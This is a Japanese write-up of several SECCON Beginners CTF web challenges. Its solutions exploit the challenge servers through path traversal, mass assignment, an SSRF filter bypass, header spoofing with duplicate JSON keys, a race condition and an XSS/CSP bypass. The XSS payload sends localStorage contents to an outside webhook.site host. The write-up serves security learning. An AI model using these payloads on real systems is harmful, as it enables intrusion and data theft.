# osoba
https://osoba.quals.beginners.seccon.jp/
```
from flask import Flask, request, send_file, make_response

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    page = request.args.get('page', 'public/index.html')    
    response = make_response(send_file(page))
    response.content_type = "text/html"
    return response

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
```
問題文にflagの場所が書いてあるので、?page=/flagにするだけ

ctf4b{omisoshiru_oishi_keredomo_tsukuruno_taihen}
# Werewolf
https://werewolf.quals.beginners.seccon.jp/
```
import os
import random
from flask import Flask, render_template, request, session

# ====================

app = Flask(__name__)
app.FLAG = os.getenv("CTF4B_FLAG")

# ====================

class Player:
    def __init__(self):
        self.name = 'test'
        self.color = 'red'
        self.__role = random.choice(['VILLAGER', 'FORTUNE_TELLER', 'PSYCHIC', 'KNIGHT', 'MADMAN'])
        # :-)
        # self.__role = random.choice(['VILLAGER', 'FORTUNE_TELLER', 'PSYCHIC', 'KNIGHT', 'MADMAN', 'WEREWOLF'])

    @property
    def role(self):
        return self.__role

    # :-)
    # @role.setter
    # def role(self, role):
    #     self.__role = role


# ====================

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == 'GET':
        return render_template('index.html')

    if request.method == 'POST':
        player = Player()

        for k, v in request.form.items():
            player.__dict__[k] = v

        return render_template('result.html',
            name=player.name,
            color=player.color,
            role=player.role,
            flag=app.FLAG if player.role == 'WEREWOLF' else ''
        )

# ====================

if __name__ == '__main__':
    app.run(host=os.getenv("CTF4B_HOST"), port=os.getenv("CTF4B_PORT"))
```
roleがWEREWOLFになればよい、Playerの初期化ではWEREWOLFにならない。  
```
        for k, v in request.form.items():
            player.__dict__[k] = v
```
この部分でroleをWEREWOLFにすればよい
```
print(player.__dict__)
//{'name': 'test', 'color': 'red', '_Player__role': 'WEREWOLF'}
```
_Player__role=WEREWOLFでフラグ
```
curl 'https://werewolf.quals.beginners.seccon.jp/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'name=a&color=red&_Player__role=WEREWOLF' \
  --compressed
```

ctf4b{there_are_so_many_hackers_among_us}
# check_url 
https://check-url.quals.beginners.seccon.jp/
```<!-- HTML Template -->
          <?php
            error_reporting(0);
            if ($_SERVER["REMOTE_ADDR"] === "127.0.0.1"){
              echo "Hi, Admin or SSSSRFer<br>";
              echo "********************FLAG********************";
            }else{
              echo "Here, take this<br>";
              $url = $_GET["url"];
              if ($url !== "https://www.example.com"){
                $url = preg_replace("/[^a-zA-Z0-9\/:]+/u", "👻", $url); //Super sanitizing
              }
              if(stripos($url,"localhost") !== false || stripos($url,"apache") !== false){
                die("do not hack me!");
              }
              echo "URL: ".$url."<br>";
              $ch = curl_init();
              curl_setopt($ch, CURLOPT_URL, $url);
              curl_setopt($ch, CURLOPT_CONNECTTIMEOUT_MS, 2000);
              curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
              echo "<iframe srcdoc='";
              curl_exec($ch);
              echo "' width='750' height='500'></iframe>";
              curl_close($ch);
            }
          ?>
<!-- HTML Template -->
```
```
                $url = preg_replace("/[^a-zA-Z0-9\/:]+/u", "👻", $url); //Super sanitizing
              }
              if(stripos($url,"localhost") !== false || stripos($url,"apache") !== false){
                die("do not hack me!");
              }
```
この部分がbypassできればよい、
~~8,~~ 16進で表現すればbypassできる
127.0.0.1 -> 0x7F000001　　
>8進はApacheだめらしい

ctf4b{5555rf_15_53rv3r_51d3_5up3r_54n171z3d_r3qu357_f0r63ry}
# json
https://json.quals.beginners.seccon.jp/
```
func checkLocal() gin.HandlerFunc {
	return func(c *gin.Context) {
		clientIP := c.ClientIP()
		ip := net.ParseIP(clientIP).To4()
		if ip[0] != byte(192) || ip[1] != byte(168) || ip[2] != byte(111) {
			c.HTML(200, "error.tmpl", gin.H{
				"ip": clientIP,
			})
			c.Abort()
			return
		}
	}
}
```
ローカルipからしかアクセスできない。```c.ClientIP()```をローカルipにしたい  
 
X-Forwarded-For でcheckを抜けれる

次に、bffではid=1,apiではid=2であることが求められる。
```
{
    id:2,
    id:1
}
```
↑みたいなjsonで解釈の違いを利用する
```
POST / HTTP/1.1
Host: json.quals.beginners.seccon.jp
Cookie: _ga=GA1.2.32864143.1621697963; _gid=GA1.2.2109961660.1621697963
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: */*
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 15
Origin: https://json.quals.beginners.seccon.jp
Referer: https://json.quals.beginners.seccon.jp/
Te: trailers
Connection: close
X-Forwarded-For:192.168.111.0

{"id":2,"id":1}
```

ctf4b{j50n_is_v4ry_u5efu1_bu7_s0metim3s_it_bi7es_b4ck}
# cant_use_db
https://cant-use-db.quals.beginners.seccon.jp/

ファイルをへの書き込みと読み込みでデータベースみたいなことをしている
race condition

```
curl --insecure 'https://cant-use-db.quals.beginners.seccon.jp/buy_noodles' \
  -X 'POST' \
  -H 'authority: cant-use-db.quals.beginners.seccon.jp' \
  -H 'content-length: 0' \
  -H 'origin: https://cant-use-db.quals.beginners.seccon.jp' \
  -H 'cookie: session=eyJ1c2VyIjoiMjA1Ni9RTjZCLW91M3NKbGswRDVudFh0OVhBdEJXWWxkSXNLa3RnRkZ4UFlkIn0.YLjDeA.szyMWZTJSQUHxEVXiipDBqO6TQc' \
  --compressed \
& curl --insecure 'https://cant-use-db.quals.beginners.seccon.jp/buy_noodles' \
  -X 'POST' \
  -H 'authority: cant-use-db.quals.beginners.seccon.jp' \
  -H 'content-length: 0' \
  -H 'origin: https://cant-use-db.quals.beginners.seccon.jp' \
  -H 'cookie: session=eyJ1c2VyIjoiMjA1Ni9RTjZCLW91M3NKbGswRDVudFh0OVhBdEJXWWxkSXNLa3RnRkZ4UFlkIn0.YLjDeA.szyMWZTJSQUHxEVXiipDBqO6TQc' \
  --compressed \
& curl --insecure 'https://cant-use-db.quals.beginners.seccon.jp/buy_soup' \
  -X 'POST' \
  -H 'authority: cant-use-db.quals.beginners.seccon.jp' \
  -H 'content-length: 0' \
  -H 'origin: https://cant-use-db.quals.beginners.seccon.jp' \
  -H 'cookie: session=eyJ1c2VyIjoiMjA1Ni9RTjZCLW91M3NKbGswRDVudFh0OVhBdEJXWWxkSXNLa3RnRkZ4UFlkIn0.YLjDeA.szyMWZTJSQUHxEVXiipDBqO6TQc' \
  --compressed 

```
をした後でflagにアクセスする

ctf4b{r4m3n_15_4n_3553n714l_d15h_f0r_h4ck1n6}
# magic
https://magic.quals.beginners.seccon.jp/

/magicに適切なトークンを渡すことでそのユーザのセッションを得ることができる。
クローラーに自分のセッションを渡して
自分のメモにXSSがあることでローカルストレージにフラグをとれる

```
app.use(function (req, res, next) {
  res.setHeader(
    "Content-Security-Policy",
    "style-src 'self' ; script-src 'self' ; object-src 'none' ; font-src 'none'"
  );
  next();
});
```
CSP level2が設定されている  
```script-src 'self``` なのでJSONP
```
app.get("/magic", async (req, res, next) => {
  // Parameter check
  if (!req.query.token) {
    return res.send("invalid parameter");
  }
  const token = req.query.token.toString();
  const getConnection = promisify(db.getConnection.bind(db));
  const connection = await getConnection();
  const query = promisify(connection.query.bind(connection));
  try {
    const result = await query(
      "SELECT id, name FROM user WHERE magic_token = ?",
      [token]
    );
    if (result.length !== 1) {
      return res.status(200).send(escapeHTML(token) + " is invalid token.");
    }
    req.session.user_id = result[0].id;
    req.session.username = result[0].name;
    req.session.magic_token = token;
    return res.redirect("/");
  } catch (e) {
    next(e);
  } finally {
    await connection.release();
  }
  return res.redirect("/login");
});

function escapeHTML(string) {
  return string
    .replace(/\&/g, "&amp;")
    .replace(/\</g, "&lt;")
    .replace(/\>/g, "&gt;")
    .replace(/\"/g, "&quot;")
    .replace(/\'/g, "&#x27");
}
```
HTMLがエスケープされている  
jsとして解釈できる形にすればよいので
```
magic?token=location=`https://webhook.site/22796d7a-5c22-48f8-8443-736abb05f2a1?a=`%2BlocalStorage.getItem(`memo`)//
```
みたいにして、それをscriptで読み込む

```
<script src='https://magic.quals.beginners.seccon.jp/magic?token=location=`https://webhook.site/22796d7a-5c22-48f8-8443-736abb05f2a1?a=`%2BlocalStorage.getItem(`memo`)//'>
```

クローラーを```/magic?token=~```を踏ませる

CPS ctf4b{w0w_y0ur_skil1ful_3xploi7_c0de_1s_lik3_4_ma6ic_7rick}